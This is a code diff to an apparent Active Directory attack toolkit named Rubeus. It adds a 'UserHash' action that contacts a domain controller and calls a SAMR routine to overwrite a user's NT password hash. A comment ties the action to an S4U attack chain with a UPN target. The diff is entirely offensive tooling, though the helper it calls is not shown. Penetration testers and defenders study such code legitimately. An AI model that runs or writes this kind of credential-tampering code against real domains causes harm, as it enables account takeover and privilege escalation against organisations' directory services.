@@ -1,8 +1,8 @@
 ﻿using System;
 using System.IO;
-using System.Linq;
 using System.Net;
 using System.Text;
+using System.Security.Principal;
 using Asn1;
 
 namespace Rubeus
@@ -197,6 +197,30 @@ namespace Rubeus
                     }
                 }
             }
+        }
+
+        public static void UserHash(string userName, string hashString, string newHashString = "", string domainController = "")
+        {
+            // a wrapper against Samr.SetNTLM
+
+            Console.WriteLine("[*] Action: Set User NT Hash\r\n");
+
+            string dcIP = Networking.GetDCIP(domainController);
+            if (String.IsNullOrEmpty(dcIP)) { return; }
+
+            byte[] hashBytes = Helpers.StringToByteArray(hashString);
+
+            byte[] newHashBytes;
+            if (String.IsNullOrEmpty(newHashString))
+                // if the new hash string is not provided in args, that's an S4U chain with a UPN target
+                newHashBytes = Samr.NewHashBytes;
+            else
+                newHashBytes = Helpers.StringToByteArray(newHashString);
+
+            if (Samr.SetNTLM(dcIP, userName, hashBytes, newHashBytes) == 0)
+                Console.WriteLine("[+] NT hash change success!\r\n");
+            else
+                Console.WriteLine("[X] NT hash change error\r\n");
         }
     }
 }
